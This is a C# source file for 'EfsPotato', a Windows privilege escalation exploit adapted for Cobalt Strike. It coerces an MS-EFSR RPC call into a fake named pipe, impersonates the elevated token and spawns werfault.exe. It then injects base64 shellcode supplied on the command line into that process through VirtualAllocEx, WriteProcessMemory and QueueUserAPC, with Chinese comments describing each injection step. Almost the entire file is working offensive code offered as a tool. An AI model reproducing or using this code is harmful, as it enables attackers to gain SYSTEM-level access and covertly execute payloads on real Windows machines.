using System;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Threading;
using System.Security.Principal;
using Microsoft.Win32.SafeHandles;
using static EfsPotato.APIDef;


namespace EfsPotato
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("[+] Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).");
            Console.WriteLine("[+] Part of GMH's fuck Tools, Code By zcgonvh, fixed by L.N. for cobaltstrike.");
            if (args.Length < 1)
            {
                Console.WriteLine("usage: EfsPotato <shellcode>");
                Console.WriteLine();
                return;
            }
            LUID_AND_ATTRIBUTES[] l = new LUID_AND_ATTRIBUTES[1];
            using (WindowsIdentity wi = WindowsIdentity.GetCurrent())
            {
                Console.WriteLine("[+] Current user: " + wi.Name);
                LookupPrivilegeValue(null, "SeImpersonatePrivilege", out l[0].Luid);
                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                tp.PrivilegeCount = 1;
                tp.Privileges = l;
                l[0].Attributes = 2;
                if (!AdjustTokenPrivileges(wi.Token, false, ref tp, Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero) || Marshal.GetLastWin32Error() != 0)
                {
                    Console.WriteLine("[x] SeImpersonatePrivilege not held.");
                    return;
                }
            }
            string g = Guid.NewGuid().ToString("d");
            string fake = @"\\.\pipe\" + g + @"\pipe\srvsvc";
            var hPipe = CreateNamedPipe(fake, 3, 0, 10, 2048, 2048, 0, IntPtr.Zero);
            if (hPipe == new IntPtr(-1))
            {
                Console.WriteLine("[x] can not create pipe: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return;
            }
            ManualResetEvent mre = new ManualResetEvent(false);
            var tn = new Thread(NamedPipeThread);
            tn.IsBackground = true;
            tn.Start(new object[] { hPipe, mre });
            var tn2 = new Thread(RpcThread);
            tn2.IsBackground = true;
            tn2.Start(g);
            if (mre.WaitOne(1000))
            {
                if (ImpersonateNamedPipeClient(hPipe))
                {
                    IntPtr tkn = WindowsIdentity.GetCurrent().Token;
                    Console.WriteLine("[+] Get Token: " + tkn);
                    SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                    sa.nLength = Marshal.SizeOf(sa);
                    sa.pSecurityDescriptor = IntPtr.Zero;
                    sa.bInheritHandle = 1;
                    IntPtr hRead, hWrite;
                    CreatePipe(out hRead, out hWrite, ref sa, 1024);
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    STARTUPINFO si = new STARTUPINFO();
                    si.cb = Marshal.SizeOf(si);
                    si.hStdError = hWrite;
                    si.hStdOutput = hWrite;
                    si.lpDesktop = "WinSta0\\Default";
                    si.dwFlags = 0x101;
                    si.wShowWindow = 0;
                    //if (CreateProcessAsUser(tkn, null, args[0], IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
                    //{
                    //    Console.WriteLine("[!] process with pid: {0} created.\r\n==============================", pi.dwProcessId);
                    //    tn = new Thread(ReadThread);
                    //    tn.IsBackground = true;
                    //    tn.Start(hRead);
                    //    new ProcessWaitHandle(new SafeWaitHandle(pi.hProcess, false)).WaitOne(-1);
                    //    tn.Abort();
                    //    CloseHandle(pi.hProcess);
                    //    CloseHandle(pi.hThread);
                    //    CloseHandle(tkn);
                    //    CloseHandle(hWrite);
                    //    CloseHandle(hRead);
                    //}

                    //傀儡进程我使用的是werfault.exe，可以自定义。
                    if (CreateProcessAsUser(tkn, @"c:\Windows\System32\werfault.exe", null, IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
                    {
                        
                        // 获取shellcode,shellcode是一个base64的字符串
                        string shellcode = args[0];
                        byte[] b_shellcode = Convert.FromBase64String(shellcode);

                        // 分配内存PAGE_READWRITE
                        IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, b_shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
                        IntPtr bytesWritten = IntPtr.Zero;
                        
                        // 写入shellcode
                        //Marshal.Copy(b_shellcode, 0, resultPtr, b_shellcode.Length);
                        bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, b_shellcode, b_shellcode.Length, out bytesWritten);

                        // 打开线程
                        IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
                        uint oldProtect = 0;

                        // 修改内存权限PAGE_EXECUTE_READ
                        resultBool = VirtualProtectEx(pi.hProcess, resultPtr, b_shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);

                        // 把shellcode地址加入apc队列
                        IntPtr ptr = QueueUserAPC(resultPtr, sht, IntPtr.Zero);

                        IntPtr ThreadHandle = pi.hThread;
                        ResumeThread(ThreadHandle);

                        Console.WriteLine("[!] process with pid: {0} created.\r\n", pi.dwProcessId);
                    }
                }
            }
            else
            {
                Console.WriteLine("[x] operation timed out.");
                CreateFile(fake, 1073741824, 0, IntPtr.Zero, 3, 0x80, IntPtr.Zero);//force cancel async operation
            }
            CloseHandle(hPipe);
        }

        //static void ReadThread(object o)
        //{
        //    IntPtr p = (IntPtr)o;
        //    FileStream fs = new FileStream(p, FileAccess.Read, false);
        //    StreamReader sr = new StreamReader(fs, Console.OutputEncoding);
        //    while (true)
        //    {
        //        string s = sr.ReadLine();
        //        if (s == null) { break; }
        //        Console.WriteLine(s);
        //    }
        //}
        static void RpcThread(object o)
        {
            string g = o as string;
            EfsrTiny r = new EfsrTiny();
            IntPtr hHandle = IntPtr.Zero;
            try
            {
                r.EfsRpcOpenFileRaw(out hHandle, "\\\\localhost/PIPE/" + g + "/\\" + g + "\\" + g, 0);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        static void NamedPipeThread(object o)
        {
            object[] objs = o as object[];
            IntPtr pipe = (IntPtr)objs[0];
            ManualResetEvent mre = objs[1] as ManualResetEvent;
            if (mre != null)
            {
                ConnectNamedPipe(pipe, IntPtr.Zero);
                mre.Set();
            }
        }
        
        
    }
    //copy from bcl
    internal class ProcessWaitHandle : WaitHandle
    {
        internal ProcessWaitHandle(SafeWaitHandle processHandle)
        {
            base.SafeWaitHandle = processHandle;
        }
    }

    
    [StructLayout(LayoutKind.Sequential)]
    struct COMM_FAULT_OFFSETS
    {
        public short CommOffset;
        public short FaultOffset;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_VERSION
    {
        public ushort MajorVersion;
        public ushort MinorVersion;
        public RPC_VERSION(ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
        {
            MajorVersion = InterfaceVersionMajor;
            MinorVersion = InterfaceVersionMinor;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_SYNTAX_IDENTIFIER
    {
        public Guid SyntaxGUID;
        public RPC_VERSION SyntaxVersion;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_CLIENT_INTERFACE
    {
        public uint Length;
        public RPC_SYNTAX_IDENTIFIER InterfaceId;
        public RPC_SYNTAX_IDENTIFIER TransferSyntax;
        public IntPtr /*PRPC_DISPATCH_TABLE*/ DispatchTable;
        public uint RpcProtseqEndpointCount;
        public IntPtr /*PRPC_PROTSEQ_ENDPOINT*/ RpcProtseqEndpoint;
        public IntPtr Reserved;
        public IntPtr InterpreterInfo;
        public uint Flags;

        public static Guid IID_SYNTAX = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60);

        public RPC_CLIENT_INTERFACE(Guid iid, ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
        {
            Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE));
            RPC_VERSION rpcVersion = new RPC_VERSION(InterfaceVersionMajor, InterfaceVersionMinor);
            InterfaceId = new RPC_SYNTAX_IDENTIFIER();
            InterfaceId.SyntaxGUID = iid;
            InterfaceId.SyntaxVersion = rpcVersion;
            rpcVersion = new RPC_VERSION(2, 0);
            TransferSyntax = new RPC_SYNTAX_IDENTIFIER();
            TransferSyntax.SyntaxGUID = IID_SYNTAX;
            TransferSyntax.SyntaxVersion = rpcVersion;
            DispatchTable = IntPtr.Zero;
            RpcProtseqEndpointCount = 0u;
            RpcProtseqEndpoint = IntPtr.Zero;
            Reserved = IntPtr.Zero;
            InterpreterInfo = IntPtr.Zero;
            Flags = 0u;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct MIDL_STUB_DESC
    {
        public IntPtr /*RPC_CLIENT_INTERFACE*/ RpcInterfaceInformation;
        public IntPtr pfnAllocate;
        public IntPtr pfnFree;
        public IntPtr pAutoBindHandle;
        public IntPtr /*NDR_RUNDOWN*/ apfnNdrRundownRoutines;
        public IntPtr /*GENERIC_BINDING_ROUTINE_PAIR*/ aGenericBindingRoutinePairs;
        public IntPtr /*EXPR_EVAL*/ apfnExprEval;
        public IntPtr /*XMIT_ROUTINE_QUINTUPLE*/ aXmitQuintuple;
        public IntPtr pFormatTypes;
        public int fCheckBounds;
        /* Ndr library version. */
        public uint Version;
        public IntPtr /*MALLOC_FREE_STRUCT*/ pMallocFreeStruct;
        public int MIDLVersion;
        public IntPtr CommFaultOffsets;
        // New fields for version 3.0+
        public IntPtr /*USER_MARSHAL_ROUTINE_QUADRUPLE*/ aUserMarshalQuadruple;
        // Notify routines - added for NT5, MIDL 5.0
        public IntPtr /*NDR_NOTIFY_ROUTINE*/ NotifyRoutineTable;
        public IntPtr mFlags;
        // International support routines - added for 64bit post NT5
        public IntPtr /*NDR_CS_ROUTINES*/ CsRoutineTables;
        public IntPtr ProxyServerInfo;
        public IntPtr /*NDR_EXPR_DESC*/ pExprInfo;
        // Fields up to now present in win2000 release.

        public MIDL_STUB_DESC(IntPtr pFormatTypesPtr, IntPtr RpcInterfaceInformationPtr,
                                IntPtr pfnAllocatePtr, IntPtr pfnFreePtr)
        {
            pFormatTypes = pFormatTypesPtr;
            RpcInterfaceInformation = RpcInterfaceInformationPtr;
            CommFaultOffsets = IntPtr.Zero;
            pfnAllocate = pfnAllocatePtr;
            pfnFree = pfnFreePtr;
            pAutoBindHandle = IntPtr.Zero;
            apfnNdrRundownRoutines = IntPtr.Zero;
            aGenericBindingRoutinePairs = IntPtr.Zero;
            apfnExprEval = IntPtr.Zero;
            aXmitQuintuple = IntPtr.Zero;
            fCheckBounds = 1;
            Version = 0x50002u;
            pMallocFreeStruct = IntPtr.Zero;
            MIDLVersion = 0x801026e;
            aUserMarshalQuadruple = IntPtr.Zero;
            NotifyRoutineTable = IntPtr.Zero;
            mFlags = new IntPtr(0x00000001);
            CsRoutineTables = IntPtr.Zero;
            ProxyServerInfo = IntPtr.Zero;
            pExprInfo = IntPtr.Zero;
        }
    }
}
